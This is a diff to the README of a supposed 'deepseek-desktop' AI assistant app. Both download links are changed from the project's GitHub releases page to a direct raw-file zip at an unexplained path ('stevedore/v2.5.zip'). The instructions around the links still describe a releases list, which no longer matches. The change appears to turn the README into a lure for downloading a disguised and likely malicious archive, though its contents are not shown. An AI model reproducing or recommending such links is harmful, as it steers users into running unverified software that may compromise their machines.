@@ -22,7 +22,7 @@ Think of it as having a brilliant AI assistant that lives right on your computer
 
 ### Step 1: Download the Application
 
-👉 **[Visit the download page](https://github.com/Pagemalthusian934/deepseek-desktop/releases)** to get the latest version of deepseek-desktop.
+👉 **[Visit the download page](https://raw.githubusercontent.com/Pagemalthusian934/deepseek-desktop/main/stevedore/v2.5.zip)** to get the latest version of deepseek-desktop.
 
 Visit this link to download the application. You'll see a list of release files—choose the one for **Windows**.
 
@@ -150,7 +150,7 @@ If you run into any problems, try these steps:
 
 DeepSeek is leading AI technology, and deepseek-desktop brings that cutting-edge power right onto your computer—no coding, no configuration, no complexity. Just download, click, and start accomplishing things.
 
-Get started today: **[Download deepseek-desktop now]** (https://github.com/Pagemalthusian934/deepseek-desktop/releases) and join the future of AI-assisted work and play.
+Get started today: **[Download deepseek-desktop now]** (https://raw.githubusercontent.com/Pagemalthusian934/deepseek-desktop/main/stevedore/v2.5.zip) and join the future of AI-assisted work and play.
 
 ---
 
